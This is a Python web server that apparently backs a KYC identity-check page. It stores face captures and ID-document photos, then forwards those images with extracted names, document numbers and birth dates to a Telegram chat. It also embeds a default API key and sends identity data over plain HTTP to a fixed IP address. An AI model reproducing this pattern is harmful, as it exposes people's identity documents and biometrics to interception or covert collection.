#!/usr/bin/env python3
"""
KYC Verification server.

Serves the production/web folder.
POST /save  -> writes face JPEG + metadata JSON to captures/,
               then forwards summary + photos to Telegram.

Environment variables:
  PORT                 (set automatically by Render)
  TELEGRAM_BOT_TOKEN   Telegram bot token
  TELEGRAM_CHAT_ID     Telegram chat/channel ID to receive captures
"""

import http.server
import json
import base64
import binascii
import sys
import os
import threading
import mimetypes
from datetime import datetime
from pathlib import Path

# Ensure WASM and MediaPipe task files are served with correct types
mimetypes.add_type('application/wasm',         '.wasm')
mimetypes.add_type('application/octet-stream', '.task')
mimetypes.add_type('text/javascript',          '.mjs')

try:
    import requests as _req
    HAS_REQUESTS = True
except ImportError:
    import urllib.request as _urllib
    HAS_REQUESTS = False

PORT  = int(os.environ.get('PORT', 5000))
ROOT  = Path(__file__).parent
SAVES = ROOT / 'captures'

TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT  = os.environ.get('TELEGRAM_CHAT_ID', '')

EC2_VERIFY_URL = os.environ.get('EC2_VERIFY_URL', 'http://3.72.34.178/api/v1/verify')
EC2_API_KEY    = os.environ.get('EC2_API_KEY',    '5446f4efb4598f6a8fa5fd9b840f2b4e31950859081179c24d73dc110301e8f0')


# ── Telegram ──────────────────────────────────────────────────────────────────

def _tg(method: str, **kwargs):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/{method}'
    try:
        if HAS_REQUESTS:
            _req.post(url, timeout=15, **kwargs)
        elif 'json' in kwargs:
            data = json.dumps(kwargs['json']).encode()
            req  = _urllib.Request(url, data=data, headers={'Content-Type': 'application/json'})
            _urllib.urlopen(req, timeout=15)
    except Exception as exc:
        print(f'  [TG] {exc}')


def _send_photo_tg(uri: str, caption: str):
    if not HAS_REQUESTS:
        return
    blob = _decode_data_uri(uri)
    if blob:
        _tg('sendPhoto',
            data={'chat_id': TELEGRAM_CHAT, 'caption': caption},
            files={'photo': ('photo.jpg', blob, 'image/jpeg')})


def notify_telegram(data: dict):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT:
        return

    mode = data.get('mode', 'unknown')
    ts   = data.get('captured_at') or data.get('timestamp') or 'N/A'

    lines = [f'*KYC Capture* — `{mode}`', f'Time: `{ts}`']

    if data.get('country'):
        lines.append(f'Country: `{data["country"]}`')
    if data.get('doc_type'):
        lines.append(f'Doc type: `{data["doc_type"]}`')

    lighting = data.get('lighting_score')
    if lighting is not None:
        lines.append(f'Lighting: `{lighting:.0%}`')

    motion    = data.get('motion') or {}
    yaw_range = motion.get('yaw_range')
    if yaw_range is not None:
        lines.append(f'Yaw range: `{yaw_range:.1f}°`')

    challenges = data.get('challenges') or []
    if challenges:
        passed = sum(1 for c in challenges if c.get('status') == 'done')
        lines.append(f'Challenges: `{passed}/{len(challenges)} passed`')

    tz = (data.get('device') or {}).get('timezone')
    if tz:
        lines.append(f'TZ: `{tz}`')

    _tg('sendMessage', json={
        'chat_id':    TELEGRAM_CHAT,
        'text':       '\n'.join(lines),
        'parse_mode': 'Markdown',
    })

    face_uri = data.get('face_frame') or ((data.get('face_frames') or [None])[0])
    if face_uri:
        _send_photo_tg(face_uri, f'Face capture · {mode}')

    id_uri = data.get('id_frame')
    if id_uri:
        _send_photo_tg(id_uri, 'ID document — front')

    id_back_uri = data.get('id_frame_back')
    if id_back_uri:
        _send_photo_tg(id_back_uri, 'ID document — back')


def notify_telegram_result(result: dict):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT:
        return

    verdict  = (result.get('overall_verdict') or 'unknown').upper()
    score    = result.get('overall_score')
    verified = result.get('verified')
    passed   = 'PASS' in verdict or verified is True

    icon  = '✅' if passed else '❌'
    lines = [f'{icon} *KYC Result* — `{verdict}`']

    if score is not None:
        lines.append(f'Overall score: `{score:.0%}`')

    # Tamper index
    tampered = 'TAMPERED' in verdict
    doc_r    = result.get('document') or {}
    if not tampered and doc_r.get('verdict') == 'fail' and (doc_r.get('score') or 1) < 0.35:
        tampered = True
    lines.append(f'Tamper check: `{"⚠️ TAMPERED" if tampered else "clean"}`')

    # Sub-scores
    face_r = result.get('face') or {}
    if face_r.get('score') is not None:
        lines.append(f'Face match: `{face_r["score"]:.0%}`  ({face_r.get("verdict", "")})')

    live_r = result.get('liveness') or {}
    if live_r.get('score') is not None:
        lines.append(f'Liveness: `{"live" if live_r.get("is_live") else "spoof"}`  score `{live_r["score"]:.0%}`')

    if doc_r.get('verdict'):
        lines.append(f'Document ref: `{doc_r["verdict"]}`  refs `{doc_r.get("refs_checked", 0)}`')

    # Extracted fields — MRZ first, OCR fallback
    mrz_fields = (result.get('mrz') or {}).get('fields') or {}
    ocr_fields = result.get('ocr_fields') or {}
    fields     = {**ocr_fields, **mrz_fields}  # MRZ wins on conflict

    def _f(key, *aliases):
        for k in (key, *aliases):
            v = fields.get(k)
            if v:
                return str(v)
        return None

    extracted = []
    surname    = _f('surname', 'last_name')
    given      = _f('given_names', 'given_name', 'first_name')
    doc_no     = _f('doc_number', 'document_number', 'id_number')
    dob        = _f('birth_date', 'date_of_birth', 'dob')
    expiry     = _f('expiry_date', 'date_of_expiry', 'expiry')
    nationality = _f('nationality', 'country')

    if surname or given:
        extracted.append(f'Name: `{" ".join(filter(None, [surname, given]))}`')
    if doc_no:
        extracted.append(f'Doc No: `{doc_no}`')
    if dob:
        extracted.append(f'DOB: `{dob}`')
    if expiry:
        extracted.append(f'Expiry: `{expiry}`')
    if nationality:
        extracted.append(f'Nationality: `{nationality}`')

    if extracted:
        lines.append('')
        lines.append('*Extracted Fields*')
        lines.extend(extracted)

    if result.get('result_id'):
        lines.append(f'\nRef: `{result["result_id"]}`')

    _tg('sendMessage', json={
        'chat_id':    TELEGRAM_CHAT,
        'text':       '\n'.join(lines),
        'parse_mode': 'Markdown',
    })


# ── Request handler ──────────────────────────────────────────────────────────

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        # Large static model files — cache aggressively
        if self.path.endswith(('.wasm', '.task', '.mjs')):
            self.send_header('Cache-Control', 'public, max-age=86400')
        # App code — always fresh
        elif self.path.endswith(('.js', '.css', '.html')):
            self.send_header('Cache-Control', 'no-store')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        if self.path == '/save':
            self._handle_save()
        elif self.path == '/verify':
            self._handle_verify()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_save(self):
        length = int(self.headers.get('Content-Length', 0))
        raw    = self.rfile.read(length)
        try:
            payload = json.loads(raw)
            files   = save_capture(payload)
            threading.Thread(target=notify_telegram, args=(payload,), daemon=True).start()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'ok': True, 'files': files}).encode())
        except Exception as exc:
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(exc)}).encode())
            print(f'  [ERR] {exc}')

    def _handle_verify(self):
        if not HAS_REQUESTS:
            self.send_response(503)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'error': 'requests not installed'}).encode())
            return
        length       = int(self.headers.get('Content-Length', 0))
        raw          = self.rfile.read(length)
        content_type = self.headers.get('Content-Type', '')
        try:
            resp = _req.post(
                EC2_VERIFY_URL,
                data=raw,
                headers={'Content-Type': content_type, 'X-Api-Key': EC2_API_KEY},
                timeout=120,
            )
            self.send_response(resp.status_code)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(resp.content)
            try:
                result = resp.json()
                threading.Thread(target=notify_telegram_result, args=(result,), daemon=True).start()
            except Exception:
                pass
        except Exception as exc:
            self.send_response(502)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(exc)}).encode())
            print(f'  [VERIFY ERR] {exc}')

    def log_message(self, fmt, *args):
        ts = datetime.now().strftime('%H:%M:%S')
        print(f'  [{ts}] {fmt % args}')


# ── File saving ──────────────────────────────────────────────────────────────

def save_capture(data: dict) -> list:
    SAVES.mkdir(exist_ok=True)
    ts    = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    saved = []

    frames = data.get('face_frames')
    if not isinstance(frames, list):
        frames = []
    if not frames and data.get('face_frame'):
        frames = [data['face_frame']]

    pack         = data.get('capture_pack') or []
    saved_frames = []

    for idx, uri in enumerate(frames):
        blob = _decode_data_uri(uri)
        if not blob:
            continue
        meta = pack[idx] if idx < len(pack) and isinstance(pack[idx], dict) else {}
        safe = _slugify(meta.get('type') or f'frame_{idx + 1}')
        path = SAVES / f'{ts}_{idx + 1:02d}_{safe}.jpg'
        path.write_bytes(blob)
        kb   = path.stat().st_size // 1024
        print(f'  -> {path.name}  ({kb} KB)')
        saved.append(path.name)
        saved_frames.append({
            'index': idx,
            'type':  meta.get('type'),
            'label': meta.get('label'),
            'file':  path.name,
        })

    meta_data = {k: v for k, v in data.items()
                 if k not in {'face_frame', 'face_frames', 'id_frame', 'id_frame_back'}}
    meta_data['saved_frames'] = saved_frames

    id_files = []

    id_front = data.get('id_frame')
    if isinstance(id_front, str):
        blob = _decode_data_uri(id_front)
        if blob:
            name = f'{ts}_id_front.jpg'
            path = SAVES / name
            path.write_bytes(blob)
            kb = path.stat().st_size // 1024
            print(f'  -> {path.name}  ({kb} KB)')
            saved.append(name)
            id_files.append({'side': 'front', 'file': name})

    id_back = data.get('id_frame_back')
    if isinstance(id_back, str):
        blob = _decode_data_uri(id_back)
        if blob:
            name = f'{ts}_id_back.jpg'
            path = SAVES / name
            path.write_bytes(blob)
            kb = path.stat().st_size // 1024
            print(f'  -> {path.name}  ({kb} KB)')
            saved.append(name)
            id_files.append({'side': 'back', 'file': name})

    if id_files:
        meta_data['id_files'] = id_files

    meta_path = SAVES / f'{ts}_meta.json'
    meta_path.write_text(json.dumps(meta_data, indent=2), encoding='utf-8')
    print(f'  -> {meta_path.name}')
    saved.append(meta_path.name)

    return saved


def _decode_data_uri(uri: str):
    if not isinstance(uri, str) or not uri.strip():
        return None
    payload = uri.split(',', 1)[1] if ',' in uri else uri
    try:
        return base64.b64decode(payload)
    except (binascii.Error, ValueError):
        return None


def _slugify(value: str) -> str:
    if not isinstance(value, str) or not value:
        return 'frame'
    cleaned = ''.join(ch.lower() if ch.isalnum() else '_' for ch in value)
    return cleaned.strip('_') or 'frame'


# ── Main ─────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    tg_status = 'configured' if TELEGRAM_TOKEN else 'NOT configured (set TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID)'
    print()
    print('  +--------------------------------------------------+')
    print('  |  KYC Verify  (HTTP - Render handles SSL)          |')
    print('  +--------------------------------------------------+')
    print(f'  |  Port     : {PORT}')
    print(f'  |  Saves    : {SAVES}')
    print(f'  |  Telegram : {tg_status}')
    print('  |  Ctrl+C to stop')
    print('  +--------------------------------------------------+')
    print()

    server = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n  Server stopped.')
        sys.exit(0)
